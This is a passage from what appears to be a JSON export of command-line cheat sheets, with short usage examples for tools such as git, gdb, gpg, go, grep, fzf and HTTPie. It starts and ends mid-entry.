https://stackoverflow.com/questions/5119946/find-exec-with-multiple-commands\nfind . -type f -exec sh -c \"echo '{}'; cat '{}';\" \\;\n\n# To find files that are newer than a file:\nfind <path> -newer <target-file>\n"
        },
        {
          "name": "firewall-cmd",
          "type": "blob",
          "size": 0.076171875,
          "content": "# Reload firewall\nfirewall-cmd --reload\n\n# List rules\nfirewall-cmd --list-all\n"
        },
        {
          "name": "fkill",
          "type": "blob",
          "size": 0.189453125,
          "content": "# To kill a process by pid\nfkill 1337\n\n# To kill processes by name (case insensitive)\nfkill safari\n\n# To kill a process listening on a port\nfkill :8080\n\n# To run the interactive interface\nfkill\n"
        },
        {
          "name": "fmt",
          "type": "blob",
          "size": 0.0634765625,
          "content": "# To format lines, 50 words in each line:\ncat <file> | fmt -w 50\n"
        },
        {
          "name": "for",
          "type": "blob",
          "size": 0.544921875,
          "content": "# basic loop\nfor i in 1 2 3 4 5 6 7 8 9 10\ndo\n  echo $i\ndone\n\n# loop ls command results\nfor var in `ls -alF`\ndo\n  echo $var\ndone\n\n# loop over all the JPG files in the current directory\nfor jpg_file in *.jpg\ndo\n  echo $jpg_file\ndone\n\n# loop specified number of times\nfor i in `seq 1 10`\ndo\n  echo $i\ndone\n\n# same as above, but as one-liner\nfor i in `seq 1 10`; do echo $i; done\n\n# loop specified number of times: the C/C++ style\nfor ((i=1;i<=10;++i))\ndo\n  echo $i\ndone\n\n# loop specified number of times: the brace expansion\nfor i in {1..10}\ndo\n  echo $i\ndone\n"
        },
        {
          "name": "fzf",
          "type": "blob",
          "size": 0.61328125,
          "content": "# To fuzzy find files in current directory\nfzf\n\n# To fuzzy find a file and cat it\ncat $(fzf)\n\n# Case sensitive search\nfzf +i\n\n# Case insensitve search\nfzf -i\n\n# Select multiple files (TAB to select, Shift+TAB to un-select) to delete\nrm -rf $(fzf --multi)\n\n# Run a preview command with fzf, specifiy a command inside the double quotes.\nfzf --preview \"file {}\"\n\n# Find files from find command and preview it with fzf\nfind . -type f -name \"*.txt\" | fzf --preview \"head {}\"\n\n# Display border around fzf output \nfzf --border sharp\n\n# Output only selected files and pipe it to a file\nfind . -type f \"*.txt\" | fzf --multi > output.txt\n"
        },
        {
          "name": "gcc",
          "type": "blob",
          "size": 0.5087890625,
          "content": "# To compile a file:\ngcc file.c\n\n# To compile a file with a custom output:\ngcc -o file file.c\n\n# debug symbols:\ngcc -g\n\n# debug with all symbols:\ngcc -ggdb3\n\n# To build for 64 bits:\ngcc -m64\n\n# Include the directory {/usr/include/myPersonnal/lib/} to the list of path for #include <....>\n# With this option, no warning / error will be reported for the files in {/usr/include/myPersonnal/lib/}\ngcc -isystem /usr/include/myPersonnal/lib/\n\n# To build a GUI for windows (Mingw) (Will disable the term/console):\ngcc -mwindows\n"
        },
        {
          "name": "gdb",
          "type": "blob",
          "size": 3.05078125,
          "content": "# To start the debugger:\ngdb <executable>, gdb --args <executable> [<args>...], gdb -p <pid>\n\n# To exit gdb (after program terminated):\nq, quit\n\n# To set a breakpoint at a function:\nb, break <function>\n\n# To set a (conditional) breakpoint at a general location:\nb, break <loc> [if <condition>]\n  with <loc> as <function>|<file>:<line>|<line>|*<address>|-offset|+offset\n\n# To set a watchpoint, i.e., stop when expression changes its value:\nwatch <expr>\n\n# To show all breakpoints and watchpoints:\ninfo breakpoints, info watchpoints\n\n# To delete all or given breakpoints and watchpoints:\nclear, delete\ndelete <num>\nclear <loc>\n  with <loc> as <function>|<file>:<line>|<line>|*<address>|-offset|+offset\n\n# To disable a breakpoint:\ndis, disable <num>\n\n# To run the program, optionally with arguments for the program:\nr, run [<args>]\n\n# To run the current line, stepping over any invocations:\nn, next\n\n# To run the current line, stepping into any invocations:\ns, step\n\n# To run until the next line below, i.e., without new loop iteration:\nu, until\n\n# Like run, but stop at the first machine instruction:\nstarti\n\n# To step or go to next line by a machine instruction\nsi, stepi\nni, nexti\n\n# To run until given location is reached\nadvance <loc>\n  with <loc> as <function>|<file>:<line>|<line>|*<address>|-offset|+offset\n\n# To run until function ends, i.e., jump out of a function:\nfin, finish\n\n# To continue execution:\nc, continue\n\n# To print a stacktrace, optionally with local variables:\nbt, backtrace [full]\n\n# Move to stack frame of given number or a frame up or down:\nframe <num>, up, down\n\n# To show summary info on selected frame:\ninfo frame\n\n# To print the arguments or local variables to the current function:\ninfo args, info locals\n\n# To print the registers:\ninfo registers\n\n# To print a list of all the threads:\ninfo threads\n\n# To print a list of all the loaded shared libraries:\ninfo sharedlibrary\n\n# To evaluate an expression and print the result:\np length=strlen(string)\n\n# To print an array of given length:\np *<array>@<len>\n\n# Examine content at address with a format and letter size:\nx/<count><fmt><size> <address>\n    ------- <fmt> ------    ------- <size> -------\n    a | Address             b | 8 bits  - byte\n    i | Instruction         h | 16 bits - halfword\n    t | Binary              w | 32 bits - word\n    o | Octal               g | 64 bits - giant\n    h | Hex\n    z | Hex, zero padded\n    d | Decimal\n    u | Unsigned decimal\n    f | Float\n    c | Char\n    s | String\n\n# To list surrounding source code:\nl, list\n\n# Disassemble the current or given function:\ndisas, disassemble [/m] [<func>]\n  with /m to show mixed source\n\n# Disassemble the given address range:\ndisas <start>,<end>\ndisas <start>,+<length>\n\n# To specify a given register, program counter, frame pointer, stack pointer\n$reg, $pc, $fp, $sp\n\n# To enable pretty print of arrays and more:\nset pretty print on\n\n# To toggle TUI mode:\nC-x C-a, C-x a, C-x A\n\n# To use a TUI layout with only one window:\nC-x 1\n\n# To use a TUI layout with two windows:\nC-x 2\n\n# To change active window:\nC-x o\n\n# To Switch in and out of the TUI SingleKey mode:\nC-x s\n"
        },
        {
          "name": "gem",
          "type": "blob",
          "size": 0.5126953125,
          "content": "---\ntags: [ packaging, ruby ]\n---\n# To search for a package:\ngem search <package>\n\n# To install a package:\ngem install <package>\n\n# To install a package in user space:\ngem install --user-install <package>\n\n# To install specific version of a package:\ngem install <package> -v <version>\n\n# To uninstall a package:\ngem uninstall <package>\n\n# To upgrade a package:\ngem update <package>\n\n# To show details of a package:\ngem info <package>\n\n# To list local packages:\ngem list --local\n\n# To show help on command:\ngem help <command>\n"
        },
        {
          "name": "gh",
          "type": "blob",
          "size": 0.5078125,
          "content": "---\nsyntax: bash\ntags: [ git, github, vcs ]\n---\n\n# View README.md:\ngh repo view\n\n# View issue list:\ngh issue list\n\n# View specific issue (e.g., the first being #1):\ngh issue view 1\n\n# Create issue (start an interactive CLI):\ngh issue create\n\n# Create pull request from a feature branch (start an interactive CLI):\ngh pr create\n\n# Create a public gist and open web browser to it:\ngh gist create hello.py -d \"my Hello-World program in Python\" -w -p\n\n# Create a custom label for issues and prs\ngh label create do-not-merge\n"
        },
        {
          "name": "git",
          "type": "blob",
          "size": 6.6455078125,
          "content": "---\ntags: [ vcs ]\n---\n# To set your identity:\ngit config --global user.name <name>\ngit config --global user.email <email>\n\n# To set your editor:\ngit config --global core.editor <editor>\n\n# To enable color:\ngit config --global color.ui true\n\n# To stage all changes for commit:\ngit add --all\n\n# To stash changes locally, this will keep the changes in a separate changelist\n# called stash and the working directory is cleaned. You can apply changes\n# from the stash anytime\ngit stash\n\n# To stash changes with a message:\ngit stash push -m <message>\n\n# To list all the stashed changes:\ngit stash list\n\n# To apply the most recent change and remove the stash from the stash list:\ngit stash pop\n\n# To apply any stash from the list of stashes. This does not remove the stash\n# from the stash list\ngit stash apply stash@{6}\n\n# To commit staged changes:\ngit commit -m <message>\n\n# To edit previous commit message:\ngit commit --amend\n\n# Git commit in the past\ngit commit --date=\"`date --date='2 day ago'`\"\ngit commit --date=\"Jun 13 18:30:25 IST 2015\"\n# more recent versions of Git also support --date=\"2 days ago\" directly\n\n# To change the date of an existing commit:\ngit filter-branch --env-filter \\\n    'if [ $GIT_COMMIT = 119f9ecf58069b265ab22f1f97d2b648faf932e0 ]\n     then\n         export GIT_AUTHOR_DATE=\"Fri Jan 2 21:38:53 2009 -0800\"\n         export GIT_COMMITTER_DATE=\"Sat May 19 01:01:01 2007 -0700\"\n     fi'\n\n# To remove staged and working directory changes:\ngit reset --hard\n\n# To go 2 commits back:\ngit reset --hard HEAD~2\n\n# Checkout the fb branch, and rebase from <remote>\ngit reset --hard <remote>/<branch>\n\n# To revert first/initial commit on a branch:\n# Running git reset --hard HEAD~1 will give error:\n# fatal: ambiguous argument 'HEAD~1': unknown revision or path not in the working tree.\ngit update-ref -d HEAD\n\n# To remove untracked files:\ngit clean -f -d\n\n# To remove untracked and ignored files:\ngit clean -f -d -x\n\n# To push to the tracked master branch:\ngit push origin master\n\n# To push to a specified repository:\ngit push git@github.com:<username>/<repo>.git\n\n# Tags: Tag a commit\ngit tag -a <tag> <commit> -m \"<commit message>\"\n\n# Tags: To push a tag to remote:\ngit push origin <tagname>\n\n# Tags: To delete a tag <tagname> on remote\ngit push --delete origin <tagname>\n\n# Tags: To delete a tag locally\ngit tag -d <tagname>\n\n# To force a push:\ngit push -f\n\n# Branches: To delete the branch <branch>:\ngit branch -D <branch>\n\n# Branches: To delete a local <branch>:\ngit branch -d <branch>\n\n# Branches: To delete a remote branch <branch>:\ngit push --delete origin <branch>\n\n# Branches: To delete all branches on remote that are already merged:\ngit branch --merged | egrep -v \"(^*|main|dev)\" | xargs git branch -d\n\n# Branches: To make an exisiting branch track a remote branch:\ngit branch -u upstream/foo\n\n# To see who commited which line in a file:\ngit blame <file>\n\n# To sync a fork with the master repo:\ngit remote add upstream git@github.com:<username>/<repo>.git # Set a new repo\ngit remote -v                                                # Confirm new remote repo\ngit fetch upstream                                           # Get branches\ngit branch -va                                               # List local - remote branches\ngit checkout master                                          # Checkout local master branch\ngit checkout -b new_branch                                   # Create and checkout a new branch\ngit merge upstream/master                                    # Merge remote into local repo\ngit show 83fb499                                             # Show what a commit did.\ngit show 83fb499:path/fo/file.ext                            # Shows the file as it appeared at 83fb499.\ngit diff branch_1 branch_2                                   # Check difference between branches\ngit log                                                      # Show all the commits\ngit status                                                   # Show the changes from last commit\n\n# To view the commit history of a set of files:\ngit log --pretty=email --patch-with-stat --reverse --full-index -- Admin\\*.py > Sripts.patch\n\n# To import commits from another repo:\ngit --git-dir=../some_other_repo/.git format-patch -k -1 --stdout <commit SHA> | git am -3 -k\n\n# To view commits that will be pushed:\ngit log @{u}..\n\n# To view changes that are new on a feature branch:\ngit log -p feature --not master\ngit diff master...feature\n\n# To perform an interactive rebase for the prior 7 commits:\ngit rebase -i @~7\n\n# To diff files WITHOUT considering them a part of git:\n# This can be used to diff files that are not in a git repo!\ngit diff --no-index path/to/file/A path/to/file/B\n\n# To pull changes while overwriting any local commits:\ngit fetch --all\ngit reset --hard origin/master\n\n# To pull down a remote branch, but rebase any locally differing commits onto\n# the top of the incoming commits:\ngit pull <remote> <branch> --rebase\n\n# To update all submodules:\ngit submodule update --init --recursive\n\n# To perform a shallow clone to only get latest commits:\n# (helps save data when cloning large repos)\ngit clone --depth 1 <remote-url>\n\n# To unshallow a clone:\ngit pull --unshallow\n\n# To create a bare branch (one that has no commits on it):\ngit checkout --orphan branch_name\n\n# To checkout a new branch from a different starting point:\ngit checkout -b master upstream/master\n\n# To remove all stale branches (ones that have been deleted on remote): So if\n# you have a lot of useless branches, delete them on Github and then run this:\ngit remote prune origin\n\n# To prune all remotes at once:\ngit remote prune $(git remote | tr '\\n' ' ')\n\n# Revisions can also be identified with :/text\n# So, this will show the first commit that has \"cool\" in their message body\ngit show :/cool\n\n# To undo parts of last commit in a specific file:\ngit checkout -p HEAD^ -- /path/to/file\n\n# To revert a commit and keep the history of the reverted change as a separate revert commit:\ngit revert <commit SHA>\n\n# To pick a commit from a branch to current branch. This is different than\n# merge as this just applies a single commit from a branch to current branch:\ngit cherry-pick <commit SHA1>\n\n# Change author of a commit:\ngit commit --amend --author=\"Author Name <email@address.com>\"\n\n# The GPG key used for signing your commits\ngit config --global user.signingkey 0A46826A\n\n# Sign new tags:\ngit tag -s v1.5 -m 'my signed 1.5 tag'\n\n# Sign a commit:\ngit commit -a -S -m 'Signed commit'\n\n# check any signatures it finds and list them in its output:\ngit log --pretty=\"format:%h %G? %aN %s\"\n\n# Defined the key to use for signing commits:\ngit config user.signingkey [KEYID]\n\n# Set signing of commits globally:\ngit config --global commit.gpgsign true\n\n# To list unstracked files:\ngit ls-files --others --exclude-standard\n"
        },
        {
          "name": "go",
          "type": "blob",
          "size": 4.439453125,
          "content": "---\nsyntax: bash\ntags: [ golang, go ]\n---\n# To run the package in the current directory\ngo run .\n\n# To run the package in the ./cmd/foo directory\ngo run ./cmd/foo/\n\n# To fetch dependencies\ngo get github.com/foo/bar@v1.2.3\ngo get github.com/foo/bar@8e1b8d3\n\n# Upgrade the dependency.\ngo get -u github.com/foo/bar\n\n# Building an Executable.\ngo build -o=/tmp/foo . # Compile the package in the current directory\ngo build -o=/tmp/foo ./cmd/foo # Compile the package in the ./cmd/foo directory\n\n# Build cache\ngo env GOCACHE # Check where your build cache is\ngo build -a -o=/tmp/foo . # Force all packages to be rebuilt\ngo clean -cache # Remove everything from the build cache\n\n\n# Cross-Compilation\nGOOS=linux GOARCH=amd64 go build -o=/tmp/linux_amd64/foo .\nGOOS=windows GOARCH=amd64 go build -o=/tmp/windows_amd64/foo.exe .\n\n# List of all supported OS/architectures\ngo tool dist list\n\n# To show all the dependencies of the module\ngo list -m all\n\n# To sho why is that a dependency?\ngo mod why -m golang.org/x/sys\n\n# Clear module cache\ngo clean -modcache\n\n# View simplified documentation for the strings package\ngo doc strings\n\n# View full documentation for the strings package\ngo doc -all strings\n\n# View documentation for the strings.Replace function\ngo doc strings.Replace\n\n# View documentation for the database/sql.DB type\ngo doc sql.DB\n\n# View documentation for the database/sql.DB.Query method\ngo doc sql.DB.Query\n\n# View the source code for the strings.Replace function\ngo doc -src strings.Replace\n\n# Run all tests in the current directory\ngo test .\n\n# Run all tests in the current directory and sub-directories\ngo test ./...\n\n# Run all tests in the ./foo/bar directory\ngo test ./foo/bar\n\n# Testing with race detector\ngo test -race ./...\n\n# Bypass the test cache when running tests\ngo test -count=1 ./...\n\n# Delete all cached test results\ngo clean -testcache\n\n# Run the test with the exact name TestFooBar\ngo test -v -run=^TestFooBar$ .\n\n# Run tests whose names start with TestFoo\ngo test -v -run=^TestFoo .\n\n# Run the Baz subtest of the TestFooBar test only\ngo test -v -run=^TestFooBar$/^Baz$ .\n\n# Handy flag - skip long running tests\ngo test -short ./...\n\n# Handy flag - don't run further tests after a failure.\ngo test -failfast ./... \n\n\n# Test all module dependencies.\ngo test all\n\n# Stress testing\ngo test -run=^TestFooBar$ -count=500 .\n\n\n# Upgrading the code to a New Go Release\ngo fix ./...\n\n# Create a new Github issue for Go's standard library\ngo bug \n\n\n# Running and Comparing Benchmarks\ngo test -bench=. ./... # Run all benchmarks and tests\ngo test -run=^$ -bench=. ./... # Run all benchmarks (and no tests)\ngo test -run=^$ -bench=^BenchmarkFoo$ ./... # Run only the BenchmarkFoo benchmark (and no tests)\ngo test -bench=. -benchmem ./... # Forces the output of memory allocation statistics\ngo test -bench=. -benchtime=5s ./... # Run each benchmark test for at least 5 seconds\ngo test -bench=. -benchtime=500x ./... # Run each benchmark test for exactly 500 iterations\ngo test -bench=. -count=3 ./... # Repeat each benchmark test 3 times over\ngo test -bench=. -cpu=1,4,8 ./... # Run benchmarks with GOMAXPROCS set to 1, 4 and 8\n\n\n# Comparing changes between benchmarks\ngo get golang.org/x/tools/cmd/benchcmp@latest # Install the compare tool.\ngo test -run=^$ -bench=. -benchmem ./... > /tmp/old.txt # Measure benchmark before changes\ngo test -run=^$ -bench=. -benchmem ./... > /tmp/new.txt # Measure benchmark after changes\nbenchcmp /tmp/old.txt /tmp/new.txt  # Compare changes.\n\n\n# Using Compiler and Linker Flags\ngo tool compile -help # complete list of available compiler flags\ngo build -gcflags=\"-m -m\" -o=/tmp/foo . # print optimization decisions\ngo build -gcflags=\"all=-m\" -o=/tmp/foo . # optimization decisions for dependencies too\ngo build -gcflags=\"all=-N -l\" -o=/tmp/foo . # disable optimizations and inlining\ngo tool link -help # list of available linker flags\ngo build -ldflags=\"-X main.version=1.2.3\" -o=/tmp/foo . # add a version number\ngo build -ldflags=\"-s -w\" -o=/tmp/foo . # strip debug information from the binary\nCGO_ENABLED=0 GOOS=linux go build -a -ldflags '-extldflags \"-static\"' . # make the binary as static as possible\n\n\n# Trace generation\ngo test -run=^$ -bench=^BenchmarkFoo$ -trace=/tmp/trace.out .\ngo tool trace /tmp/trace.out # Works only on Chrome / Chromium at the moment\n\n\n# Viewing Environment Information\ngo env # List all environment variables.\ngo env -w GOPATH=/foo/bar # Set GOPATH environment variable to /foo/bar\n\n# Checking for Race Conditions\ngo build -race -o=/tmp/foo . # not for production\n"
        },
        {
          "name": "gpg",
          "type": "blob",
          "size": 4.1708984375,
          "content": "# Create a key\n gpg --gen-key\n\n\n# Show keys\n  To list a summary of all keys\n\n    gpg --list-keys\n\n  To show your public key\n\n    gpg --armor --export\n\n  To show the fingerprint for a key\n\n    gpg --fingerprint KEY_ID\n\n# Search for keys\n  gpg --search-keys 'user@emailaddress.com'\n\n\n# To Encrypt a File\n  gpg --encrypt --recipient 'user@emailaddress.com' example.txt\n\n\n# To Decrypt a File\n  gpg --output example.txt --decrypt example.txt.gpg\n\n\n# Export keys\n  gpg --output ~/public_key.txt --armor --export KEY_ID\n  gpg --output ~/private_key.txt --armor --export-secret-key KEY_ID\n\n  Where KEY_ID is the 8 character GPG key ID.\n\n  Store these files to a safe location, such as a USB drive, then\n  remove the private key file.\n\n    shred -zu ~/private_key.txt\n\n# Import keys\n  Retrieve the key files which you previously exported.\n\n    gpg --import ~/public_key.txt\n    gpg --allow-secret-key-import --import ~/private_key.txt\n\n  Then delete the private key file.\n\n    shred -zu ~/private_key.txt\n\n# Revoke a key\n  Create a revocation certificate.\n\n    gpg --output ~/revoke.asc --gen-revoke KEY_ID\n\n  Where KEY_ID is the 8 character GPG key ID.\n\n  After creating the certificate import it.\n\n    gpg --import ~/revoke.asc\n\n  Then ensure that key servers know about the revokation.\n\n    gpg --send-keys KEY_ID\n\n# Signing and Verifying files\n  If you are uploading files to launchpad you may also want to include\n  a GPG signature file.\n\n    gpg -ba filename\n\n  or if you need to specify a particular key:\n\n    gpg --default-key <key ID> -ba filename\n\n  This then produces a file with a .asc extension which can be uploaded.\n  If you need to set the default key more permanently then edit the\n  file ~/.gnupg/gpg.conf and set the default-key parameter.\n\n  To verify a downloaded file using its signature file.\n\n  gpg --verify filename.asc\n\n# Signing Public Keys\n  Import the public key or retrieve it from a server.\n\n    gpg --keyserver <keyserver> --recv-keys <Key_ID>\n\n  Check its fingerprint against any previously stated value.\n\n    gpg --fingerprint <Key_ID>\n\n  Sign the key.\n\n    gpg --sign-key <Key_ID>\n\n  Upload the signed key to a server.\n\n    gpg --keyserver <keyserver> --send-key <Key_ID>\n\n# Change the email address associated with a GPG key\n  gpg --edit-key <key ID>\n  adduid\n\n  Enter the new name and email address. You can then list the addresses with:\n\n    list\n\n  If you want to delete a previous email address first select it:\n\n    uid <list number>\n\n  Then delete it with:\n\n    deluid\n\n  To finish type:\n\n    save\n\n  Publish the key to a server:\n\n    gpg --send-keys <key ID>\n\n# Creating Subkeys\n  Subkeys can be useful if you don't wish to have your main GPG key\n  installed on multiple machines. In this way you can keep your\n  master key safe and have subkeys with expiry periods or which may be\n  separately revoked installed on various machines. This avoids\n  generating entirely separate keys and so breaking any web of trust\n  which has been established.\n\n    gpg --edit-key <key ID>\n\n  At the prompt type:\n\n    addkey\n\n  Choose RSA (sign only), 4096 bits and select an expiry period.\n  Entropy will be gathered.\n\n  At the prompt type:\n\n    save\n\n  You can also repeat the procedure, but selecting RSA (encrypt only).\n  To remove the master key, leaving only the subkey/s in place:\n\n    gpg --export-secret-subkeys <subkey ID> > subkeys\n    gpg --export <key ID> > pubkeys\n    gpg --delete-secret-key <key ID>\n\n  Import the keys back.\n\n    gpg --import pubkeys subkeys\n\n  Verify the import.\n\n    gpg -K\n\n  Should show sec# instead of just sec.\n  \n# High-quality options for gpg for symmetric (secret key) encryption\n  This is what knowledgable people consider a good set of options for \n  symmetric encryption with gpg to give you a high-quality result.\n  \n  gpg \\\n    --symmetric \\\n    --cipher-algo aes256 \\\n    --digest-algo sha512 \\\n    --cert-digest-algo sha512 \\\n    --compress-algo none -z 0 \\\n    --s2k-mode 3 \\\n    --s2k-digest-algo sha512 \\\n    --s2k-count 65011712 \\\n    --force-mdc \\\n    --pinentry-mode loopback \\\n    --armor \\\n    --no-symkey-cache \\\n    --output somefile.gpg \\\n    somefile # to encrypt\n    \n  gpg \\\n    --decrypt \\\n    --pinentry-mode loopback \\\n    --armor \\\n    --output somefile.gpg \\\n    somefile # to decrypt\n"
        },
        {
          "name": "gradle",
          "type": "blob",
          "size": 0.7021484375,
          "content": "---\nsyntax: bash\ntags: [ development, build ]\n---\n# To compile, test and package a project:\ngradle build\n\n# To skip a task from the build:\ngradle build -x <test>\n\n# To prevent Gradle from accessing the network during builds:\ngradle build --offline\n\n# To clear the build directory:\ngradle clean\n\n# To refresh the project dependencies:\ngradle clean build --refresh-dependencies\n\n# To list the project dependencies:\ngradle dependencies\n\n# To list the tasks you can run in your project:\ngradle tasks\n\n# To list all the tasks:\ngradle tasks --all\n\n# To create a Gradle build for a new project or convert a Maven build to Gradle:\ngradle init\n\n# To create a Gradle build for a new Java project:\ngradle init --type java-library\n"
        },
        {
          "name": "grep",
          "type": "blob",
          "size": 0.9404296875,
          "content": "# To search a file for a pattern:\ngrep <pattern> <file>\n\n# To perform a case-insensitive search (with line numbers):\ngrep -in <pattern> <file>\n\n# To recursively grep for string <pattern> in <dir>:\ngrep -R <pattern> <dir>\n\n# Read search patterns from a file (one per line):\ngrep -f <pattern-file> <file>\n\n# Find lines NOT containing pattern:\ngrep -v <pattern> <file>\n\n# Set how many lines to show before (-B) and after (-A) pattern:\ngrep -B 3 -A 2 <pattern> <file>\n\n# To grep with regular expressions:\ngrep \"^00\" <file>                                               # Match lines starting with 00\ngrep -E \"[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\" <file> # Find IP add\n\n# To find all files that match <pattern> in <dir>\ngrep -rnw <dir> -e <pattern>\n\n# To exclude grep from your grepped output of ps:\n# (Add [] to the first letter. Ex: sshd -> [s]shd)\nps aux | grep '[h]ttpd'\n\n# Colour in red {bash} and keep all other lines\nps aux | grep -E --color 'bash|$'\n"
        },
        {
          "name": "gs",
          "type": "blob",
          "size": 0.109375,
          "content": "# To reduce the size of a pdf file:\ngs -dBATCH -dNOPAUSE -q -sDEVICE=pdfwrite -sOutputFile=output.pdf input.pdf\n"
        },
        {
          "name": "guix-shell",
          "type": "blob",
          "size": 0.345703125,
          "content": "---\ntags: [ environment ]\n---\n# Download/Build the desired packages in the store and make their executables available in the current interactive shell\nguix shell <package-name> <package-name> ...\n\n# Download/Build the desired packages in the store and invoke a `command` in the environment with package executables\nguix shell <package-name> -- <command>\n"
        },
        {
          "name": "gyb",
          "type": "blob",
          "size": 0.603515625,
          "content": "# To estimate the number and the size of all mails on youremail@gmail.com\ngyb --email youremail@gmail.com --action estimate\n\n# To backup from youremail@gmail.com to your local-folder \ngyb --email youremail@gmail.com --action backup --local-folder \"~/MyLocalFolder/\"\n\n# To backup from youremail@gmail.com only important or starred emails to the\n# default local folder GYB-GMail-Backup-youremail@gmail.com\ngyb --email youremail@gmail.com --search \"is:important OR is:starred\"\n\n# To restore from your local-folder to youremail@gmail.com\ngyb --email youremail@gmail.com --action restore --local-folder \"~/MyLocalFolder/\" \n"
        },
        {
          "name": "gzip",
          "type": "blob",
          "size": 0.5048828125,
          "content": "---\ntags: [ compression ]\n---\n# To create a *.gz compressed file\ngzip test.txt\n\n# To create a *.gz compressed file to a specific location using -c option (standard out)\ngzip -c test.txt > test_custom.txt.gz\n\n# To uncompress a *.gz file\ngzip -d test.txt.gz\n\n# Display compression ratio of the compressed file using gzip -l\ngzip -l *.gz\n\n# Recursively compress all the files under a specified directory\ngzip -r documents_directory\n\n# To create a *.gz compressed file and keep the original\ngzip < test.txt > test.txt.gz\n"
        },
        {
          "name": "hardware-info",
          "type": "blob",
          "size": 0.5439453125,
          "content": "# To display all hardware details:\nsudo lshw\n\n# To list currently loaded kernel modules:\nlsmod\n\n# To list all available modules:\nfind /lib/modules/$(uname -r) -type f -iname \"*.ko\"\n\n# To load a module:\nmodprobe <module>\n\n# To remove a module:\nmodprobe -r <module>\n\n# To list devices connected via pci bus:\nlspci\n\n# To debug output for pci devices (hex):\nlspci -vvxxx\n\n# To display cpu hardware stats:\ncat /proc/cpuinfo\n\n# To display memory hardware stats:\ncat /proc/meminfo\n\n# To output the kernel ring buffer:\ndmesg\n\n# Ouput kernel messages\ndmesg --kernel\n"
        },
        {
          "name": "head",
          "type": "blob",
          "size": 0.189453125,
          "content": "# To show the first 10 lines of <file>:\nhead <file>\n\n# To show the first <number> lines of <file>:\nhead -n <number> <file>\n\n# To show the first <number> bytes of <file>:\nhead -c <number> <file>\n"
        },
        {
          "name": "hg",
          "type": "blob",
          "size": 0.416015625,
          "content": "---\ntags: [ vcs ]\n---\n# To clone a directory:\nhg clone\n\n# To add files to hg tracker:\nhg add <file>\n\n# To add all files in <dir> to hg tracker:\nhg add <dir>\n\n# To create a commit with all tracked changes and a message:\nhg commit -m <message>\n\n# To push commits to source repository:\nhg push\n\n# To pull changes from source repository:\nhg pull\n\n# To rebase local commits to disambiguate with remote repository:\nhg pull --rebase\n"
        },
        {
          "name": "history",
          "type": "blob",
          "size": 0.1962890625,
          "content": "# To see most used top 10 commands:\nhistory | awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] \" \" CMD[a]/count*100 \"% \" a;}' | grep -v \"./\" | column -c3 -s \" \" -t | sort -nr | nl | head -n10\n"
        },
        {
          "name": "http",
          "type": "blob",
          "size": 7.728515625,
          "content": "# Custom HTTP method HTTP headers and JSON data:\nhttp PUT example.org X-API-Token:123 name=John\n\n# Submitting forms:\nhttp -f POST example.org hello=World\n\n# See the request that is being sent using one of the output options:\nhttp -v example.org\n\n# Use Github API to post a comment on an issue with authentication:\nhttp -a USERNAME POST https://api.github.com/repos/jkbrzt/httpie/issues/83/comments body='HTTPie is awesome!'\n\n# Upload a file using redirected input:\nhttp example.org < file.json\n\n# Download a file and save it via redirected output:\nhttp example.org/file > file\n\n# Download a file wget style:\nhttp --download example.org/file\n\n# Use named sessions_ to make certain aspects or the communication\n# persistent between requests to the same host:\n# http --session=logged-in -a username:password httpbin.org/get API-Key:123\nhttp --session=logged-in httpbin.org/headers\n\n# Set a custom Host header to work around missing DNS records:\nhttp localhost:8000 Host:example.com\n\n# Simple JSON example:\nhttp PUT example.org name=John email=john@example.org\n\n# Non-string fields use the := separator, which allows you to embed raw\n# JSON into the resulting object. Text and raw JSON files can also be\n# embedded into fields using =@ and :=@:\nhttp PUT api.example.com/person/1 name=John age:=29 married:=false hobbies:='[\"http\", \"pies\"]' description=@about-john.txt bookmarks:=@bookmarks.json\n\n# Send JSON data stored in a file:\nhttp POST api.example.com/person/1 < person.json\n\n# Regular Forms\nhttp --form POST api.example.org/person/1 name='John Smith' email=john@example.org cv=@~/Documents/cv.txt\n\n# File Upload Forms\n# If one or more file fields is present, the serialization and content\n# type is multipart/form-data:\nhttp -f POST example.com/jobs name='John Smith' cv@~/Documents/cv.pdf\n\n# To set custom headers you can use the Header:Value notation:\nhttp example.org  User-Agent:Bacon/1.0  'Cookie:valued-visitor=yes;foo=bar' X-Foo:Bar  Referer:http://httpie.org/\n\n# Basic auth:\nhttp -a username:password example.org\n\n# Digest auth:\nhttp --auth-type=digest -a username:password example.org\n\n# With password prompt:\nhttp -a username example.org\n\n# Authorization information from your ~/.netrc file is honored as well:\ncat ~/.netrc\n    machine httpbin.org\n    login httpie\n    # password test\nhttp httpbin.org/basic-auth/httpie/test\n\n# You can specify proxies to be used through the --proxy argument for each\n# protocol (which is included in the value in case of redirects across\n# protocols):\nhttp --proxy=http:http://10.10.1.10:3128 --proxy=https:https://10.10.1.10:1080 example.org\n\n# With Basic authentication:\nhttp --proxy=http:http://user:pass@10.10.1.10:3128 example.org\n\n# To skip the HOST'S SSL CERTIFICATE VERIFICATION, you can pass\n# --verify=no (default is yes):\nhttp --verify=no https://example.org\n\n# You can also use --verify=<CA_BUNDLE_PATH> to set a CUSTOM CA BUNDLE path:\nhttp --verify=/ssl/custom_ca_bundle https://example.org\n\n# To use a CLIENT SIDE CERTIFICATE for the SSL communication, you can pass\n# the path of the cert file with --cert:\nhttp --cert=client.pem https://example.org\n\n# If the PRIVATE KEY is not contained in the cert file you may pass the\n# path of the key file with --cert-key:\nhttp --cert=client.crt --cert-key=client.key https://example.org\n\n# You can control what should be printed via several options:\n  # --headers, -h   Only the response headers are printed.\n  # --body, -b      Only the response body is printed.\n  # --verbose, -v   Print the whole HTTP exchange (request and response).\n  # --print, -p     Selects parts of the HTTP exchange.\nhttp --verbose PUT httpbin.org/put hello=world\n\n# Print request and response headers:\n  # Character   Stands for\n  # ----------- -------------------\n  # H           Request headers.\n  # B           Request body.\n  # h           Response headers.\n  # b           Response body.\nhttp --print=Hh PUT httpbin.org/put hello=world\n\n# Let's say that there is an API that returns the whole resource when it\n# is updated, but you are only interested in the response headers to see\n# the status code after an update:\nhttp --headers PATCH example.org/Really-Huge-Resource name='New Name'\n\n# Redirect from a file:\nhttp PUT example.com/person/1 X-API-Token:123 < person.json\n\n# Or the output of another program:\ngrep '401 Unauthorized' /var/log/httpd/error_log | http POST example.org/intruders\n\n# You can use echo for simple data:\necho '{\"name\": \"John\"}' | http PATCH example.com/person/1 X-API-Token:123\n\n# You can even pipe web services together using HTTPie:\nhttp GET 